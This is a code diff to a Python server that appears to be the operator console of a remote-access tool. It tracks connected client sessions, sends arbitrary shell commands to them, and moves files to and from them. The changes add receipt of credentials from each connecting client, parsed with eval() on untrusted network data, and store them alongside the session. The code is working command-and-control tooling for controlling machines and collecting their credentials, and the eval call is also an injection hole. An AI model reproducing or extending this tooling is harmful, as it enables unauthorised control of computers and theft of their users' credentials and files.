@@ -27,6 +27,8 @@ def list():
         num += 1 
     print("use number for interaction with socket. For example 'use 0'")  #MAKE HERE BEAUTIFUL
 
+    print(connections)
+
 def help():
     print("list\nuse\nexit")
 
@@ -36,12 +38,12 @@ def use(session):
         client_socket = connections[session]['socket']
         while 1:
             command = input(f"\n[*] You're interacting with {session} Enter command > ")
+            if command == 'exit':                         
+                break                                           
+            
             client_socket.send(command.encode())
             command = command.split(" ")      
-#################################################################      
-            if command[0] == 'exit':                            #
-                break                                           #
-#################################################################
+
             match command[0]:
                 case  'download':
                     download(from_=command[1], where=command[2], session=session)
@@ -59,12 +61,15 @@ def exit():
 
 def listen_incoming():
     while True:
-        # Accept incoming connection
-    
+        # Accept incoming connection    
         client_socket, address = server_socket.accept()
-        connection = {"address": address, 'socket': client_socket}
+        cred = client_socket.recv(4096).decode()
+        cred = eval(cred) #TODO change eval to json.loads
+        # connections.append(cred)
+        connection = {"address": address, 'socket': client_socket, 'cred':cred}
         connections.append(connection)
-        
+
+
 def download(from_, where, session):
     socket = connections[session]['socket']
     socket.send(from_.encode())
@@ -81,6 +86,7 @@ def download(from_, where, session):
     file.close()
     print("File sent succesfully!")
 
+
 def upload(what, where, session):
     socket = connections[session]['socket']
     socket.send(where.encode())
@@ -95,6 +101,7 @@ def upload(what, where, session):
     time.sleep(0.3)
     socket.send(b"\n\r")
     file.close()
+
 
 threading.Thread(target=listen_incoming).start()
 
@@ -117,6 +124,6 @@ while 1:
             exit()
         case 'use':
             use(command[1])
-            break
+            
 
 sys.exit()
